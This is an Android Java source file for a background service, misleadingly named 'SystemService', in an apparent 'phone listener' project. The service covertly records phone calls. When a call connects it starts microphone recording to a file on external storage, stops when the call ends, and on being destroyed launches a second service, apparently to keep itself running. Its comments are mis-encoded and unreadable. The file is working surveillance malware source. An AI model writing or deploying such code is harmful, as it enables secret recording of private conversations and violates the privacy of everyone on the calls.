package com.zww.phonelisner;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class SystemService extends Service {
	private TelephonyManager tm;
	//����������
	private MyListener listener;
	
	//����¼����
	private MediaRecorder mediaRecorder;
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}
	//���񴴽�ʱ���õķ���
	@Override
	public void onCreate() {
		//��̨�����绰�ĺ���״̬
		tm=(TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);//��õ绰���������
		listener=new MyListener();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}
	


	private class MyListener extends PhoneStateListener {
		//���绰״̬�����ı�ʱ���õķ���
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE://����״̬
						//����״̬��ֹͣ¼�����ж�mediaRecored�Ƿ�ʵ����
					if(mediaRecorder!=null){
						mediaRecorder.stop();//8ֹͣ¼��
						//�ͷ���Դ
						mediaRecorder.release();
						System.out.println("¼����ϣ��ϴ��ļ���������");
					}
					break;
				case  TelephonyManager.CALL_STATE_RINGING: //����״̬
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK://ͨ��״̬
				       //ͨ��״̬ʱ����һ��¼����
					//׼����ʼ¼��
					//1.ʵ����һ��mediaRecorder
					mediaRecorder=new MediaRecorder();
					//2ָ��¼����������Դ����˷�
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					//3��������ļ��ĸ�ʽ
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					//4ָ��¼���ļ�������
					//����һ���ļ�����
					File file = new File(Environment.getExternalStorageDirectory(),System.currentTimeMillis()+".3gp");
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					//5������Ƶ�ı��뷽ʽ
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					//6׼��¼��
					mediaRecorder.prepare();
					//7��ʼ¼��
					mediaRecorder.start();
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			} 
		}
		
	}
	
	//��������ʱ���õķ���
	public void onDestroy() {	
		super.onDestroy();
		//ȡ���绰�ļ���
		Intent i=new Intent(this,SystemService2.class);
		startService(i);
		tm.listen(listener, PhoneStateListener.LISTEN_NONE);
	}

}
